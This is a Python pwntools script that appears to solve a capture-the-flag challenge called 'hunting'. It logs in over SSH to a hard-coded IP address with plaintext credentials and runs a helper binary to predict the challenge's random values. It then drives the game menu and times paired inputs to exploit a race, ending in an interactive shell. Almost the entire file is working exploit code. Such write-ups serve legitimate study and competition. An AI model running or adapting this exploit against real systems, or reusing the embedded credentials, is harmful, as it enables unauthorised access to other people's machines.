#!/usr/bin/python

from pwn import *
import time

def switch_skill(target):
    menu = h.recvuntil('choice:')
    log.info(menu)

    h.sendline('3')
    skills = h.recvuntil('choice:')

    h.sendline(str(target))

def use_skill(token, inc, rlist):
    menu = h.recvuntil('choice:')
    log.info(menu)

    h.sendline('2')
    attack = h.recvuntil('===Skill Activation')
    attack += h.recvuntil('=======================================')
    log.info(attack)

    token += 2
    h.sendline(rlist[token])
    guard = h.recv('========================================')
    log.info(guard)

    return token, attack


s = ssh(host = '110.10.212.133', user = 'hunting', password = 'hunting', port = 5556)

print time.time()
h = s.process(['/home/hunting/hunting'])
r = s.process(['a.out'], cwd='/tmp/hunter/')
print time.time()

rlist = r.recvall()
rlist = rlist.split('\n')[:-1]

switch_skill(3)

token = -1

while True:
    token, attack = use_skill(token, 2, rlist)
    if 'upgrading' in attack:
        break

while True:
    token, attack = use_skill(token, 2, rlist)
    if 'upgrading' in attack:
        break

while True:
    token, attack = use_skill(token, 2, rlist)
    if 'upgrading' in attack:
        break

print '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>stage3 clear'
sleep(1)

while True:
    payload = '3 2 2 '
    token += 2
    payload += rlist[token]

    payload2 = ' 3 7 2 '
    token += 4
    payload2 += rlist[token]

    h.sendline(payload)
    time.sleep(0.95)
    h.sendline(payload2)

    attack = h.recvuntil('==Skill Activation')
    guard = h.recvuntil('=======================================')

    log.info(attack + guard)

    if 'upgrading' in attack + guard:
        h.interactive()
